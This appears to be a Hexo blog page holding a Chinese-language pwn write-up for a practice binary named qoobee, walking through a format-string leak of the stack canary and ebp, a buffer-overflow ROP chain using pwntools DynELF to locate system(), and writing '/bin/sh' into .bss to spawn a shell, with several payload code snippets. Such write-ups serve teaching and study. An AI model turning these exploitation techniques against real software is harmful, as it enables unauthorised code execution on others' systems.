@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>x86 Memory Leak在不获取libc.so的情况下进行ROP攻击 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="下载qoobee分析程序：1.运行程序2.找到第一个功能：3.进入adopt函数：可以看到开辟了一个堆，这个堆是用来存储QooBee信息的，返回堆的指针，保存在main函数的ebp-10h。堆中信息和位置：4.分析整个程序，发现show_info()函数里有一个format string漏洞。description()函数里有一个buffer overflow函数。但是函数有栈保护，需要知道can">
+<meta property="og:type" content="article">
+<meta property="og:title" content="x86 Memory Leak在不获取libc.so的情况下进行ROP攻击">
+<meta property="og:url" content="http://example.com/2016/03/23/x86-Memory-Leak%E5%9C%A8%E4%B8%8D%E8%8E%B7%E5%8F%96libc-so%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="下载qoobee分析程序：1.运行程序2.找到第一个功能：3.进入adopt函数：可以看到开辟了一个堆，这个堆是用来存储QooBee信息的，返回堆的指针，保存在main函数的ebp-10h。堆中信息和位置：4.分析整个程序，发现show_info()函数里有一个format string漏洞。description()函数里有一个buffer overflow函数。但是函数有栈保护，需要知道can">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/memoryleak/qoobee.png">
+<meta property="og:image" content="http://example.com/images/memoryleak/adopt.jpg">
+<meta property="og:image" content="http://example.com/images/memoryleak/heap_ptr.JPG">
+<meta property="og:image" content="http://example.com/images/memoryleak/heap_struct.png">
+<meta property="og:image" content="http://example.com/images/memoryleak/strfmt.jpg">
+<meta property="og:image" content="http://example.com/images/memoryleak/bufof.jpg">
+<meta property="article:published_time" content="2016-03-23T03:07:12.000Z">
+<meta property="article:modified_time" content="2020-11-12T02:26:14.769Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/memoryleak/qoobee.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-x86-Memory-Leak在不获取libc-so的情况下进行ROP攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/03/23/x86-Memory-Leak%E5%9C%A8%E4%B8%8D%E8%8E%B7%E5%8F%96libc-so%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2016-03-23T03:07:12.000Z" itemprop="datePublished">2016-03-23</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      x86 Memory Leak在不获取libc.so的情况下进行ROP攻击
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>下载<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1dDQBN8H">qoobee</a><br>分析程序：<br>1.运行程序<br><img src="/images/memoryleak/qoobee.png"><br>2.找到第一个功能：<br><img src="/images/memoryleak/adopt.jpg"><br>3.进入adopt函数：<br><img src="/images/memoryleak/heap_ptr.JPG"><br>可以看到开辟了一个堆，这个堆是用来存储QooBee信息的，返回堆的指针，保存在main函数的<code>ebp-10h</code>。<br>堆中信息和位置：<br><img src="/images/memoryleak/heap_struct.png"><br>4.分析整个程序，发现<code>show_info()</code>函数里有一个format string漏洞。<br><img src="/images/memoryleak/strfmt.jpg"><br><code>description()</code>函数里有一个buffer overflow函数。但是函数有栈保护，需要知道canary，正好可以通过前面发现的format string漏洞得到（同一个程序的不同函数里的canary是相同的）。<br><img src="/images/memoryleak/bufof.jpg"><br>5.通过format string漏洞获得canary和ebp的值：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Your Choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;QooBee Name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;QooBee Age: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;AAAA%11$x%14$x&#x27;</span>) <span class="comment">#格式化字符串，打印出栈上第11和第14个存储单元，对应的是canary和ebp的值</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description(30 bytes): &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your Choice: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;AAA&#x27;</span>)</span><br><span class="line">leak_mem = p.recv(<span class="number">16</span>)</span><br><span class="line">canary = atoi(leak_mem[:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">ebp = atoi(leak_mem[<span class="number">8</span>:], <span class="number">16</span>) - <span class="number">0x30</span> <span class="comment">#show_info()的ebp比description()的ebp大0x30，可以通过下断点查看</span></span><br></pre></td></tr></table></figure>
+<p>6.获得canary和ebp就可以利用buffer overflow的漏洞了，下一步就是获取<code>system()</code>函数在内存中的地址。这里我们采用<code>pwntools</code>提供的<code>DynELF</code>模块来进行内存搜索。首先我们需要实现一个<code>leak(address)</code>函数，通过这个函数可以获取到某个地址上最少1 byte的数据。<br>leak函数应该是这样的：  </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your Choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;QooBee Name: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;QooBee Age: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Description(30 bytes): &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">30</span> + p32(canary) + <span class="string">&#x27;B&#x27;</span> * <span class="number">8</span> + p32(ebp) + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>
+<p>7.随后将这个函数作为参数再调用<code>d = DynELF(leak, elf=ELF(&#39;./qoobee&#39;))</code>就可以对DynELF模块进行初始化了。然后可以通过调用<code>system_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)</code>来得到libc.so中system()在内存中的地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = DynELF(leak, elf = ELF(<span class="string">&#x27;./qoobee&#x27;</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br></pre></td></tr></table></figure>
+<p>8.要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的<code>.bss</code>段中。<code>.bss</code>段是用来保存全局变量的值的，地址固定，并且可以读可写。通过<code>readelf -S qoobee</code>这个命令就可以获取到<code>.bss</code>段的地址了。</p>
+<blockquote>
+<p>$ readelf -S qoobee<br>There are 28 section headers, starting at offset 0x279c:</p>
+</blockquote>
+<blockquote>
+<p>Section Headers:<br>  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al<br>  [ 0]                   NULL            00000000 000000 000000 00      0   0  0<br>  [ 1] .interp           PROGBITS        08048134 000134 000013 00   A  0   0  1<br>  ……<br>  [22] .got              PROGBITS        0804b5fc 0025fc 000004 04  WA  0   0  4<br>  [23] .got.plt          PROGBITS        0804b600 002600 000070 04  WA  0   0  4<br>  [24] .data             PROGBITS        0804b670 002670 00000c 00  WA  0   0  4<br>  [25] .bss              NOBITS          0804b680 00267c 00000c 00  WA  0   0 32<br>  ……  </p>
+</blockquote>
+<p>9.因为我们在执行完read()之后要接着调用<code>system(“/bin/sh”)</code>，并且read()这个函数的参数有三个，所以我们需要一个<code>pop pop pop ret</code>的gadget用来保证栈平衡。<br>10.整个攻击过程如下：首先通过DynELF获取到system()的地址后，我们又通过read将“/bin/sh”写入到<code>.bss</code>段上，最后再调用<code>system(.bss)</code>，执行“/bin/sh”。<br>最终的<a target="_blank" rel="noopener" href="http://pan.baidu.com/s/1hqRlPw4">exp</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/7551">http://drops.wooyun.org/papers/7551</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2016/03/23/x86-Memory-Leak%E5%9C%A8%E4%B8%8D%E8%8E%B7%E5%8F%96libc-so%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E8%BF%9B%E8%A1%8CROP%E6%94%BB%E5%87%BB/" data-id="ckhe7o4n9005bchl7531aagbx" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2016/04/04/Linux-x64-PWN/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Linux_x64 PWN
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2016/03/06/%E4%BD%BF%E7%94%A8makefile/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">使用makefile</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARM/" rel="tag">ARM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Algorithms/" rel="tag">Algorithms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blockchain/" rel="tag">Blockchain</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C-C/" rel="tag">C/C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Fuzzing/" rel="tag">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IoT/" rel="tag">IoT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kernel/" rel="tag">Kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine-Learning/" rel="tag">Machine Learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Symbolic-Execution/" rel="tag">Symbolic Execution</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tensorflow/" rel="tag">Tensorflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Virtual/" rel="tag">Virtual</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ARM/" style="font-size: 11px;">ARM</a> <a href="/tags/Algorithms/" style="font-size: 10px;">Algorithms</a> <a href="/tags/Android/" style="font-size: 20px;">Android</a> <a href="/tags/Blockchain/" style="font-size: 11px;">Blockchain</a> <a href="/tags/C-C/" style="font-size: 18px;">C/C++</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Fuzzing/" style="font-size: 15px;">Fuzzing</a> <a href="/tags/IoT/" style="font-size: 12px;">IoT</a> <a href="/tags/Java/" style="font-size: 14px;">Java</a> <a href="/tags/Kernel/" style="font-size: 19px;">Kernel</a> <a href="/tags/Machine-Learning/" style="font-size: 17px;">Machine Learning</a> <a href="/tags/Pwn/" style="font-size: 19px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 13px;">Reverse</a> <a href="/tags/Symbolic-Execution/" style="font-size: 12px;">Symbolic Execution</a> <a href="/tags/Tensorflow/" style="font-size: 10px;">Tensorflow</a> <a href="/tags/Virtual/" style="font-size: 16px;">Virtual</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/06/">June 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">September 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/03/">March 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">February 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">December 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/05/">May 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/07/29/so%E6%96%87%E4%BB%B6%E7%9A%84-init-array%E6%AE%B5%E4%B8%AD%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%A0%81/">so文件的.init_array段中添加代码</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/09/PID-namespace/">PID namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/08/Mount-namespace/">Mount namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/06/User-namespace/">User namespace</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/01/UnionFS%E6%8A%80%E6%9C%AF/">UnionFS技术</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
